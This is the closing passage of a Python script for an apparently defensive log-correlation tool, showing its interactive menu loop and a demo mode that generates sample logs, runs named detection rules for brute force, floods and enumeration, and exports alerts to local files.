            "3": self._action_stats,
            "4": self._action_analyse,
            "5": self._action_show_alerts,
            "6": self._action_export,
            "7": self._action_save_logs,
            "8": self._action_list_rules,
            "9": self._action_clear,
            "0": None,   # exit sentinel
        }

        while True:
            print(self.MENU.format(
                cyan=Color.CYAN, bold=Color.BOLD, reset=Color.RESET,
            ))
            try:
                choice = input(Color.paint("  Select option ▶ ", Color.BOLD)).strip()
            except (EOFError, KeyboardInterrupt):
                choice = "0"

            if choice == "0":
                print(Color.paint("\n  Goodbye.\n", Color.CYAN))
                break

            action = ACTIONS.get(choice)
            if action is None:
                print(Color.paint(f"  [!] Unknown option: '{choice}'", Color.YELLOW))
            else:
                try:
                    action()
                except Exception as exc:
                    print(Color.paint(f"  [ERROR] {exc}", Color.RED))


# ─────────────────────────────────────────────────────────────────
#  Quick-run demo (non-interactive)  –  triggered by --demo flag
# ─────────────────────────────────────────────────────────────────

def run_demo() -> None:
    """
    Non-interactive smoke-test: generate → analyse → export.
    Useful for CI pipelines or a quick first look.
    """
    banner()
    print(Color.paint("  [DEMO MODE]  Generating logs → Analysing → Exporting …\n",
                      Color.MAGENTA, Color.BOLD))

    # 1. Generate
    gen     = LogGenerator()
    entries = gen.generate()
    print(Color.paint(f"  [✔] Generated {len(entries):,} log entries.", Color.GREEN))

    # 2. Analyse
    engine = CorrelationEngine()
    for rule in [
        rule_brute_force,
        rule_sensitive_url_post_auth,
        rule_http_flood,
        rule_suspicious_commands,
        rule_directory_enumeration,
        rule_failed_auth_storm,
    ]:
        engine.register_rule(rule)

    engine.analyse(entries)
    engine.display_alerts()

    # 3. Export
    engine.export_alerts("alerts.txt")
    LogParser.save_to_file(entries, "logs.tsv")
    print(Color.paint("\n  Demo complete.  Check alerts.txt and logs.tsv.\n", Color.CYAN))


# ─────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────

def main() -> None:
    if "--demo" in sys.argv or "-d" in sys.argv:
        run_demo()
    else:
        CLI().run()


if __name__ == "__main__":
    main()